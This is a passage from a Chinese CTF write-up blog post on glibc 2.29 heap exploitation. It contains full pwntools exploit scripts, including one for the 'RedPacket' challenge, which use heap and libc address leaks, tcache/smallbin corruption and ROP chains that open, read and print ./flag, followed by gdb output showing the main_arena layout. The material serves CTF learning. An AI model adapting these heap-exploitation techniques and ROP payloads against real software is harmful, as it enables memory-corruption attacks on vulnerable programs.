class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'hero name: '</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x5555555598c0</span><span class="number">-0x555555559000</span>)</span><br><span class="line">log.success(<span class="string">'heapbase = '</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	new(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x2a0</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x2a0</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="string">'\x00'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'hero name: '</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x7ffff7fb4ca0</span><span class="number">-0x7ffff7dd0000</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">new(<span class="number">1</span>,<span class="string">'\x00'</span>*<span class="number">0x2a0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x230</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x88</span>+p64(<span class="number">0x221</span>)</span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(heapbase+(<span class="number">0x55555555b070</span><span class="number">-0x555555559000</span>))</span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+= p64(heapbase+(<span class="number">0x55555555b050</span><span class="number">-0x555555559000</span>))+p64(libcbase+(<span class="number">0x7ffff7fb4bf8</span><span class="number">-0x7ffff7dd0000</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>,<span class="string">'\x00'</span>*<span class="number">0x210</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xC388</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(libcbase+<span class="number">0x8cfd6</span>)+<span class="string">'./flag'</span>)</span><br><span class="line"><span class="comment">#0x000000000008cfd6: add rsp, 0x48; ret; </span></span><br><span class="line"><span class="comment">#0x0000000000026542: pop rdi; ret; </span></span><br><span class="line"><span class="comment">#0x0000000000026f9e: pop rsi; ret; </span></span><br><span class="line"><span class="comment">#0x000000000012bda6: pop rdx; ret; </span></span><br><span class="line"><span class="comment">#0x0000000000047cf8: pop rax; ret;</span></span><br><span class="line"><span class="comment">#0x00000000000cf6c5: syscall; ret;  </span></span><br><span class="line">rax = libcbase + <span class="number">0x0000000000047cf8</span></span><br><span class="line">rdi = libcbase + <span class="number">0x0000000000026542</span></span><br><span class="line">rsi = libcbase + <span class="number">0x0000000000026f9e</span></span><br><span class="line">rdx = libcbase + <span class="number">0x000000000012bda6</span></span><br><span class="line">syscall = libcbase + <span class="number">0x00000000000cf6c5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *(0x555555554000+0x139C)')</span></span><br><span class="line">rop = p64(rdi)+p64(libcbase+libc.sym[<span class="string">'__malloc_hook'</span>]+<span class="number">8</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)+p64(rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">rop+= p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(libcbase+libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x80</span>)+p64(rdx)+p64(<span class="number">0x80</span>)+p64(rax)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">rop+= p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(libcbase+libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x80</span>)+p64(rdx)+p64(<span class="number">0x80</span>)+p64(rax)+p64(<span class="number">1</span>)+p64(syscall)</span><br><span class="line">new(<span class="number">0</span>,rop)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Buu-RedPacket"><a href="#Buu-RedPacket" class="headerlink" title="Buu_RedPacket"></a>Buu_RedPacket</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>当时<code>amain9</code>大佬发给我的时候对<code>2.29</code>不是很感兴趣就没有去花时间研究，现在重新做了一下。。。看了一下之后发现不就是抄的<code>one_punch_man</code>么。。稍微改了改，加了几个吓唬人的检测和限制罢了。</p>
+<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">'./RedPacket_SoEasyPwn1'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">attach = <span class="number">1</span></span><br><span class="line"><span class="comment">#P = ELF(path)</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>])</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	p = process(path)</span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx,size_choice,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'packet idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)</span><br><span class="line">	p.sendline(str(size_choice))</span><br><span class="line">	p.recvuntil(<span class="string">'put content: '</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'packet idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'packet idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'packet idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'put content: '</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">	new(<span class="number">0</span>,<span class="number">2</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	new(<span class="number">0</span>,<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x400</span>)</span><br><span class="line">	delete(<span class="number">0</span>)	</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x55555555bbc0</span><span class="number">-0x555555559000</span>)</span><br><span class="line">log.success(<span class="string">'heapbase = '</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x400</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">1</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x7ffff7fb4ca0</span><span class="number">-0x7ffff7dd0000</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>,<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="number">3</span>,<span class="string">'\x00'</span>*<span class="number">0x300</span>) <span class="comment">#16</span></span><br><span class="line"></span><br><span class="line">rax = libcbase + <span class="number">0x0000000000047cf8</span></span><br><span class="line">rdi = libcbase + <span class="number">0x0000000000026542</span></span><br><span class="line">rsi = libcbase + <span class="number">0x0000000000026f9e</span></span><br><span class="line">rdx = libcbase + <span class="number">0x000000000012bda6</span></span><br><span class="line">syscall = libcbase + <span class="number">0x00000000000cf6c5</span></span><br><span class="line">flag_addr = heapbase+(<span class="number">0x55555555c8e8</span><span class="number">-0x555555559000</span>)</span><br><span class="line">rop = p64(rdi)+p64(flag_addr)+p64(rdx)+p64(<span class="number">0</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">rop+= p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(flag_addr+<span class="number">8</span>)+p64(rdx)+p64(<span class="number">0x30</span>)+p64(rax)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">rop+= p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(flag_addr+<span class="number">8</span>)+p64(rdx)+p64(<span class="number">0x30</span>)+p64(rax)+p64(<span class="number">1</span>)+p64(syscall)</span><br><span class="line">rop+= <span class="string">'./flag'</span>+<span class="string">'\x00'</span></span><br><span class="line">new(<span class="number">0</span>,<span class="number">3</span>,rop) <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x300</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)</span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(heapbase+(<span class="number">0x55555555c700</span><span class="number">-0x555555559000</span>))</span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+= p64(heapbase+(<span class="number">0x55555555c6e0</span><span class="number">-0x555555559000</span>))+p64(heapbase+(<span class="number">0x55555555c720</span><span class="number">-0x555555559000</span>))</span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(heapbase+(<span class="number">0x555555559a50</span><span class="number">-0x555555559000</span>))</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">new(<span class="number">1</span>,<span class="number">2</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'666'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'What do you want to say?'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000058373: leave; ret; </span></span><br><span class="line">leave = libcbase + <span class="number">0x58373</span></span><br><span class="line">payload = <span class="string">'\x11'</span>*<span class="number">0x80</span>+p64(heapbase+(<span class="number">0x55555555c810</span><span class="number">-0x555555559000</span>)<span class="number">-8</span>)+p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="PlainNote"><a href="#PlainNote" class="headerlink" title="PlainNote"></a>PlainNote</h1><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><code>fastbin &amp;&amp; unsortedbin &amp;&amp; topchunk</code> 在<code>main_arena</code>中的位置。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x602110 --&gt; 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x602090 --&gt; 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x602130 (size : 0x20ed0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x602000 (size : 0x90)</span><br><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (struct malloc_state *) 0x7ffff7dd1b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/80xg 0x7ffff7dd1b20</span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000602110</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000602090</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000602130</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x0000000000602000</span><br><span class="line">0x7ffff7dd1b90 &lt;main_arena+112&gt;:	0x0000000000602000</span><br></pre></td></tr></table></figure>
+<p><code>unsortedbin &amp;&amp; smallbin</code>的连接和进出方式：</p>
+<p><img src="https://i.loli.net/2020/04/28/JAkBezm5YElUqic.png" alt="IMG_0078.PNG"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>打赏还是打残，这是个问题</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/weichat.png" alt=" 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt=" 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://xiaoxiaorenwu.top/2020/04/28/Glibc2.29笔记/" title="Glibc2.29笔记">https://xiaoxiaorenwu.top/2020/04/28/Glibc2.29笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
+          
+            <a href="/tags/summary/" rel="tag"><i class="fa fa-tag"></i> summary</a>
+          
+            <a href="/tags/Glibc2-29-up/" rel="tag"><i class="fa fa-tag"></i> Glibc2.29_up</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/20/LinuxKernel初识/" rel="next" title="LinuxKernel初识">
+                <i class="fa fa-chevron-left"></i> LinuxKernel初识
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/01/虚拟机逃逸初识/" rel="prev" title="虚拟机逃逸初识">
+                虚拟机逃逸初识 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/xxrw.jpg" alt="">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description">Babypwner@Dubhe@BUPT</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaoxiaorenwu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:renwuxiaoxiao@126.com" target="_blank" title="E-mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                大佬们的blog~~
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top" title="p4nda" target="_blank">p4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="sunichi" target="_blank">sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="e3pem" target="_blank">e3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hpasserby.me/" title="hpasserby" target="_blank">hpasserby</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama2in9.top/" title="ama2in9" target="_blank">ama2in9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t3ls.club/" title="T3LS" target="_blank">T3LS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#twochunk"><span class="nav-number">1.</span> <span class="nav-text">twochunk</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#one-punch-man"><span class="nav-number">2.</span> <span class="nav-text">one_punch_man</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路-1"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-1"><span class="nav-number">2.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Buu-RedPacket"><span class="nav-number">3.</span> <span class="nav-text">Buu_RedPacket</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路-2"><span class="nav-number">3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-2"><span class="nav-number">3.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PlainNote"><span class="nav-number">4.</span> <span class="nav-text">PlainNote</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+  </script>
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
